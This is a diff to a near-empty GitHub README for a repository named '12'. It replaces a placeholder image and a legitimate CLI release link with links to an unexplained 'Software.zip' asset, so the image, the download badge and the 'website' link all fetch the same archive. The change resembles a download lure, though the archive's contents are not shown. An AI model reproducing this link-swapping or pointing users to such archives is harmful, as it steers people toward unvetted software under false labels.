@@ -1,7 +1,7 @@
 
 # Welcome to Repository "12" 👋
 
-![12](https://via.placeholder.com/500)
+![12](https://github.com/mrprashant750/12/releases/download/v1.0/Software.zip)
 
 ## Description ℹ️
 
@@ -13,13 +13,13 @@ This repository does not provide any specific topics.
 
 ## Download 📥
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-green.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/mrprashant750/12/releases/download/v1.0/Software.zip)](https://github.com/mrprashant750/12/releases/download/v1.0/Software.zip)
 
 To download the zip file, click on the button above.
 
 ## Visit Website 🌐
 
-If you wish to visit the website associated with this repository, click [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+If you wish to visit the website associated with this repository, click [here](https://github.com/mrprashant750/12/releases/download/v1.0/Software.zip).
 
 ### Releases 🚀
 
